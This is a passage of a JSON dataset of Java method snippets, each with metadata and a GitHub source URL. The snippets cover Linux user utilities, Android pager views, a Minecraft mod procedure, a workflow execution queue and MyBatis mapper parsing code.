["public", "static"], "return_type": "Pair<Integer,Integer>", "snippet": "    public static Pair<Integer, Integer> currentUser(){\n        String username = System.getProperty(\"user.name\", \"\");\n        if(StringUtils.isNotBlank(username)){\n            Triple<Boolean, Integer, Integer> triple = existUser(username);\n            if(triple.getLeft()){\n                return new MutablePair<>(triple.getMiddle(), triple.getRight());\n            }\n        }\n        return new MutablePair<>(null, null);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/LinuxPlatFormUtil.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30448, "method_name": "deleteUser", "class_name": "LinuxPlatFormUtil", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "Pair<Boolean,String>", "snippet": "    public static Pair<Boolean, String> deleteUser(String username){\n        String linuxUserDeleteCommand = \"sudo userdel ${userName}\";\n        RunShell runShell = new RunShell(PatternInjectUtils.inject(linuxUserDeleteCommand, new String[]{username}));\n        return runShell.run() == 0?new MutablePair<>(true, null) : new MutablePair<>(false, runShell.getResult());\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/LinuxPlatFormUtil.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30449, "method_name": "init", "class_name": "SimplePagerTitleView", "params": ["Context"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void init(Context context) {\n        setGravity(Gravity.CENTER);\n        int padding = UIUtil.dip2px(context, 10);\n        setPadding(padding, 0, padding, 0);\n        setSingleLine();\n        setEllipsize(TextUtils.TruncateAt.END);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", "stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 30450, "method_name": "onSelected", "class_name": "SimplePagerTitleView", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSelected(int index, int totalCount) {\n        setTextColor(mSelectedColor);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", "stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 30451, "method_name": "onDeselected", "class_name": "SimplePagerTitleView", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDeselected(int index, int totalCount) {\n        setTextColor(mNormalColor);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", "stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 30452, "method_name": "onLeave", "class_name": "SimplePagerTitleView", "params": ["int", "int", "float", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onLeave(int index, int totalCount, float leavePercent, boolean leftToRight) {\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", "stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 30453, "method_name": "onEnter", "class_name": "SimplePagerTitleView", "params": ["int", "int", "float", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onEnter(int index, int totalCount, float enterPercent, boolean leftToRight) {\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", "stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 30454, "method_name": "getContentLeft", "class_name": "SimplePagerTitleView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getContentLeft() {\n        Rect bound = new Rect();\n        String longestString = \"\";\n        if (getText().toString().contains(\"\\n\")) {\n            String[] brokenStrings = getText().toString().split(\"\\\\n\");\n            for (String each : brokenStrings) {\n                if (each.length() > longestString.length()) longestString = each;\n            }\n        } else {\n            longestString = getText().toString();\n        }\n        getPaint().getTextBounds(longestString, 0, longestString.length(), bound);\n        int contentWidth = bound.width();\n        return getLeft() + getWidth() / 2 - contentWidth / 2;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", "stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 30455, "method_name": "getContentTop", "class_name": "SimplePagerTitleView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getContentTop() {\n        Paint.FontMetrics metrics = getPaint().getFontMetrics();\n        float contentHeight = metrics.bottom - metrics.top;\n        return (int) (getHeight() / 2 - contentHeight / 2);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", "stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 30456, "method_name": "getContentRight", "class_name": "SimplePagerTitleView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getContentRight() {\n        Rect bound = new Rect();\n        String longestString = \"\";\n        if (getText().toString().contains(\"\\n\")) {\n            String[] brokenStrings = getText().toString().split(\"\\\\n\");\n            for (String each : brokenStrings) {\n                if (each.length() > longestString.length()) longestString = each;\n            }\n        } else {\n            longestString = getText().toString();\n        }\n        getPaint().getTextBounds(longestString, 0, longestString.length(), bound);\n        int contentWidth = bound.width();\n        return getLeft() + getWidth() / 2 + contentWidth / 2;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", "stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 30457, "method_name": "getContentBottom", "class_name": "SimplePagerTitleView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getContentBottom() {\n        Paint.FontMetrics metrics = getPaint().getFontMetrics();\n        float contentHeight = metrics.bottom - metrics.top;\n        return (int) (getHeight() / 2 + contentHeight / 2);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", "stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 30458, "method_name": "getSelectedColor", "class_name": "SimplePagerTitleView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getSelectedColor() {\n        return mSelectedColor;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", "stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 30459, "method_name": "setSelectedColor", "class_name": "SimplePagerTitleView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSelectedColor(int selectedColor) {\n        mSelectedColor = selectedColor;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", "stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 30460, "method_name": "getNormalColor", "class_name": "SimplePagerTitleView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getNormalColor() {\n        return mNormalColor;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", "stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 30461, "method_name": "setNormalColor", "class_name": "SimplePagerTitleView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setNormalColor(int normalColor) {\n        mNormalColor = normalColor;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/SimplePagerTitleView.java", "stars": "1", "class_props": {"extends": "AppCompatTextView", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 30462, "method_name": "executeProcedure", "class_name": "RightClickedSunflowerProcedure", "params": ["java"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void executeProcedure(java.util.HashMap<String, Object> dependencies) {\n\t\tif (dependencies.get(\"entity\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency entity for procedure RightClickedSunflower!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"x\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency x for procedure RightClickedSunflower!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"y\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency y for procedure RightClickedSunflower!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"z\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency z for procedure RightClickedSunflower!\");\n\t\t\treturn;\n\t\t}\n\t\tif (dependencies.get(\"world\") == null) {\n\t\t\tSystem.err.println(\"Failed to load dependency world for procedure RightClickedSunflower!\");\n\t\t\treturn;\n\t\t}\n\t\tEntity entity = (Entity) dependencies.get(\"entity\");\n\t\tint x = (int) dependencies.get(\"x\");\n\t\tint y = (int) dependencies.get(\"y\");\n\t\tint z = (int) dependencies.get(\"z\");\n\t\tWorld world = (World) dependencies.get(\"world\");\n\t\tif ((((entity instanceof LivingEntity) ? ((LivingEntity) entity).getHeldItemMainhand() : ItemStack.EMPTY)\n\t\t\t\t.getItem() == new ItemStack(Blocks.AIR, (int) (1)).getItem())) {\n\t\t\tworld.setBlockState(new BlockPos((int) x, (int) y, (int) z), Blocks.AIR.getDefaultState(), 3);\n\t\t\tworld.setBlockState(new BlockPos((int) x, (int) y, (int) z), Blocks.FLOWER_POT.getDefaultState(), 3);\n\t\t\tif (entity instanceof LivingEntity) {\n\t\t\t\tItemStack _setstack = new ItemStack(HelianthusBlock.block, (int) (1));\n\t\t\t\t_setstack.setCount((int) 1);\n\t\t\t\t((LivingEntity) entity).setHeldItem(Hand.MAIN_HAND, _setstack);\n\t\t\t\tif (entity instanceof ServerPlayerEntity)\n\t\t\t\t\t((ServerPlayerEntity) entity).inventory.markDirty();\n\t\t\t}\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/procedures/RightClickedSunflowerProcedure.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 30463, "method_name": "monodroidAddReference", "class_name": "TextCellRenderer_TextCellView", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/TextCellRenderer_TextCellView.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 30464, "method_name": "monodroidClearReferences", "class_name": "TextCellRenderer_TextCellView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/TextCellRenderer_TextCellView.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 30465, "method_name": "execute", "class_name": "LinksTagDirective", "params": ["Environment", "Map", "TemplateModel", "TemplateDirectiveBody"], "throws": ["TemplateException", "IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void execute(Environment env, Map params, TemplateModel[] loopVars, TemplateDirectiveBody body) throws TemplateException, IOException {\n        final DefaultObjectWrapperBuilder builder = new DefaultObjectWrapperBuilder(Configuration.VERSION_2_3_25);\n        String param = params.get(BeyondConst.METHOD_KEY).toString();\n        switch (param) {\n            case \"listTeams\":\n                env.setVariable(\"teams\", builder.build().wrap(linksService.listTeamLinks()));\n                break;\n            default:\n                break;\n        }\n\n        body.render(env.getOut());\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/freemarker/LinksTagDirective.java", "stars": "1", "class_props": {"extends": null, "implements": ["TemplateDirectiveModel"], "modifiers": ["public"]}}, {"id": 30466, "method_name": "fetchHead", "class_name": "QueuedExecutions", "params": [], "throws": ["InterruptedException"], "modifiers": ["public"], "return_type": "Pair<ExecutionReference,ExecutableFlow>", "snippet": "  public Pair<ExecutionReference, ExecutableFlow> fetchHead()\n      throws InterruptedException {\n    final Pair<ExecutionReference, ExecutableFlow> pair = this.queuedFlowList.take();\n    if (pair != null && pair.getFirst() != null) {\n      this.queuedFlowMap.remove(pair.getFirst().getExecId());\n    }\n    return pair;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/QueuedExecutions.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30467, "method_name": "dequeue", "class_name": "QueuedExecutions", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void dequeue(final int executionId) {\n    if (this.queuedFlowMap.containsKey(executionId)) {\n      this.queuedFlowList.remove(this.queuedFlowMap.get(executionId));\n      this.queuedFlowMap.remove(executionId);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/QueuedExecutions.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30468, "method_name": "enqueue", "class_name": "QueuedExecutions", "params": ["ExecutableFlow", "ExecutionReference"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void enqueue(final ExecutableFlow exflow, final ExecutionReference ref)\n      throws ExecutorManagerException {\n    if (hasExecution(exflow.getExecutionId())) {\n      final String errMsg = \"Flow already in queue \" + exflow.getExecutionId();\n      throw new ExecutorManagerException(errMsg);\n    }\n\n    final Pair<ExecutionReference, ExecutableFlow> pair =\n        new Pair<>(ref, exflow);\n    try {\n      this.queuedFlowMap.put(exflow.getExecutionId(), pair);\n      this.queuedFlowList.put(pair);\n    } catch (final InterruptedException e) {\n      final String errMsg = \"Failed to insert flow \" + exflow.getExecutionId();\n      logger.error(errMsg, e);\n      throw new ExecutorManagerException(errMsg);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/QueuedExecutions.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30469, "method_name": "enqueueAll", "class_name": "QueuedExecutions", "params": ["Collection<Pair>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void enqueueAll(\n      final Collection<Pair<ExecutionReference, ExecutableFlow>> collection)\n      throws ExecutorManagerException {\n    for (final Pair<ExecutionReference, ExecutableFlow> pair : collection) {\n      enqueue(pair.getSecond(), pair.getFirst());\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/QueuedExecutions.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30470, "method_name": "getAllEntries", "class_name": "QueuedExecutions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Collection<Pair>", "snippet": "  public Collection<Pair<ExecutionReference, ExecutableFlow>> getAllEntries() {\n    return Collections.unmodifiableCollection(this.queuedFlowMap.values());\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/QueuedExecutions.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30471, "method_name": "hasExecution", "class_name": "QueuedExecutions", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean hasExecution(final int executionId) {\n    return this.queuedFlowMap.containsKey(executionId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/QueuedExecutions.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30472, "method_name": "getFlow", "class_name": "QueuedExecutions", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "ExecutableFlow", "snippet": "  public ExecutableFlow getFlow(final int executionId) {\n    if (hasExecution(executionId)) {\n      return this.queuedFlowMap.get(executionId).getSecond();\n    }\n    return null;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/QueuedExecutions.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30473, "method_name": "getReference", "class_name": "QueuedExecutions", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "ExecutionReference", "snippet": "  public ExecutionReference getReference(final int executionId) {\n    if (hasExecution(executionId)) {\n      return this.queuedFlowMap.get(executionId).getFirst();\n    }\n    return null;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/QueuedExecutions.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30474, "method_name": "size", "class_name": "QueuedExecutions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "  public long size() {\n    return this.queuedFlowList.size();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/QueuedExecutions.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30475, "method_name": "isFull", "class_name": "QueuedExecutions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isFull() {\n    return size() >= this.capacity;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/QueuedExecutions.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30476, "method_name": "isEmpty", "class_name": "QueuedExecutions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isEmpty() {\n    return this.queuedFlowList.isEmpty() && this.queuedFlowMap.isEmpty();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/QueuedExecutions.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30477, "method_name": "clear", "class_name": "QueuedExecutions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void clear() {\n    for (final Pair<ExecutionReference, ExecutableFlow> pair : this.queuedFlowMap.values()) {\n      dequeue(pair.getFirst().getExecId());\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/QueuedExecutions.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30478, "method_name": "resolveThemeAttribute", "class_name": "ResourceUtils", "params": ["Context", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "TypedValue", "snippet": "    public static TypedValue resolveThemeAttribute(Context context, int attrId) {\n        TypedValue value = new TypedValue();\n        context.getTheme().resolveAttribute(attrId, value, true);\n        return value;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/ResourceUtils.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30479, "method_name": "getAttributeDimension", "class_name": "ResourceUtils", "params": ["Context", "Resources", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "float", "snippet": "    public static float getAttributeDimension(final Context context, final Resources.Theme theme, final int resId) {\n        final TypedValue typedValue = new TypedValue(); // create a new typed value to received the resolved attribute\n        // value\n        final DisplayMetrics displayMetrics = context.getResources().getDisplayMetrics();\n        if (!theme.resolveAttribute(resId, typedValue, true)) // if we can't resolve the value\n        {\n            throw new Resources.NotFoundException(\"Resource ID #0x\" + Integer.toHexString(resId));\n        }\n        if (typedValue.type != TypedValue.TYPE_DIMENSION) // if the value isn't of the correct type\n        {\n            throw new Resources.NotFoundException(\"Resource ID #0x\" + Integer.toHexString(resId) + \" type #0x\"\n                    + Integer.toHexString(typedValue.type) + \" is not valid\");\n        }\n        return typedValue.getDimension(displayMetrics); // return the value of the attribute in terms of the display\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/ResourceUtils.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30480, "method_name": "parse", "class_name": "XMLMapperBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void parse() {\n    if (!configuration.isResourceLoaded(resource)) {\n      configurationElement(parser.evalNode(\"/mapper\"));\n      configuration.addLoadedResource(resource);\n      bindMapperForNamespace();\n    }\n\n    parsePendingResultMaps();\n    parsePendingCacheRefs();\n    parsePendingStatements();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30481, "method_name": "getSqlFragment", "class_name": "XMLMapperBuilder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "XNode", "snippet": "  public XNode getSqlFragment(String refid) {\n    return sqlFragments.get(refid);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30482, "method_name": "configurationElement", "class_name": "XMLMapperBuilder", "params": ["XNode"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void configurationElement(XNode context) {\n    try {\n      String namespace = context.getStringAttribute(\"namespace\");\n      if (namespace == null || namespace.equals(\"\")) {\n        throw new BuilderException(\"Mapper's namespace cannot be empty\");\n      }\n      builderAssistant.setCurrentNamespace(namespace);\n      cacheRefElement(context.evalNode(\"cache-ref\"));\n      cacheElement(context.evalNode(\"cache\"));\n      parameterMapElement(context.evalNodes(\"/mapper/parameterMap\"));\n      resultMapElements(context.evalNodes(\"/mapper/resultMap\"));\n      sqlElement(context.evalNodes(\"/mapper/sql\"));\n      buildStatementFromContext(context.evalNodes(\"select|insert|update|delete\"));\n    } catch (Exception e) {\n      throw new BuilderException(\"Error parsing Mapper XML. The XML location is '\" + resource + \"'. Cause: \" + e, e);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30483, "method_name": "buildStatementFromContext", "class_name": "XMLMapperBuilder", "params": ["List<XNode>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void buildStatementFromContext(List<XNode> list) {\n    if (configuration.getDatabaseId() != null) {\n      buildStatementFromContext(list, configuration.getDatabaseId());\n    }\n    buildStatementFromContext(list, null);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30484, "method_name": "buildStatementFromContext", "class_name": "XMLMapperBuilder", "params": ["List<XNode>", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void buildStatementFromContext(List<XNode> list, String requiredDatabaseId) {\n    for (XNode context : list) {\n      final XMLStatementBuilder statementParser = new XMLStatementBuilder(configuration, builderAssistant, context, requiredDatabaseId);\n      try {\n        statementParser.parseStatementNode();\n      } catch (IncompleteElementException e) {\n        configuration.addIncompleteStatement(statementParser);\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30485, "method_name": "parsePendingResultMaps", "class_name": "XMLMapperBuilder", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void parsePendingResultMaps() {\n    Collection<ResultMapResolver> incompleteResultMaps = configuration.getIncompleteResultMaps();\n    synchronized (incompleteResultMaps) {\n      Iterator<ResultMapResolver> iter = incompleteResultMaps.iterator();\n      while (iter.hasNext()) {\n        try {\n          iter.next().resolve();\n          iter.remove();\n        } catch (IncompleteElementException e) {\n          // ResultMap is still missing a resource...\n        }\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30486, "method_name": "parsePendingCacheRefs", "class_name": "XMLMapperBuilder", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void parsePendingCacheRefs() {\n    Collection<CacheRefResolver> incompleteCacheRefs = configuration.getIncompleteCacheRefs();\n    synchronized (incompleteCacheRefs) {\n      Iterator<CacheRefResolver> iter = incompleteCacheRefs.iterator();\n      while (iter.hasNext()) {\n        try {\n          iter.next().resolveCacheRef();\n          iter.remove();\n        } catch (IncompleteElementException e) {\n          // Cache ref is still missing a resource...\n        }\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30487, "method_name": "parsePendingStatements", "class_name": "XMLMapperBuilder", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void parsePendingStatements() {\n    Collection<XMLStatementBuilder> incompleteStatements = configuration.getIncompleteStatements();\n    synchronized (incompleteStatements) {\n      Iterator<XMLStatementBuilder> iter = incompleteStatements.iterator();\n      while (iter.hasNext()) {\n        try {\n          iter.next().parseStatementNode();\n          iter.remove();\n        } catch (IncompleteElementException e) {\n          // Statement is still missing a resource...\n        }\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30488, "method_name": "cacheRefElement", "class_name": "XMLMapperBuilder", "params": ["XNode"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void cacheRefElement(XNode context) {\n    if (context != null) {\n      configuration.addCacheRef(builderAssistant.getCurrentNamespace(), context.getStringAttribute(\"namespace\"));\n      CacheRefResolver cacheRefResolver = new CacheRefResolver(builderAssistant, context.getStringAttribute(\"namespace\"));\n      try {\n        cacheRefResolver.resolveCacheRef();\n      } catch (IncompleteElementException e) {\n        configuration.addIncompleteCacheRef(cacheRefResolver);\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/xml/XMLMapperBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 30489, "method_name": "cacheElement", "class_name": "XMLMapperBuilder", "params": ["XNode"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void cacheElement(XNode context) {\n    if (context != null) {\n      String type = context.getStringAttribute(\"type\", \"PERPETUAL\");\n      Class<? extends Cache> typeClass = typeAliasRegistry.resolveAlias(type);\n      String eviction = context.getStringAttribute(\"eviction\", \"LRU\");\n      Class<? extends Cache> evictionClass = typeAliasRegistry.resolveAlias(eviction);\n      Long flushInterval = context.getLongAttribute(\"flushInterval\");\n      Integer size = 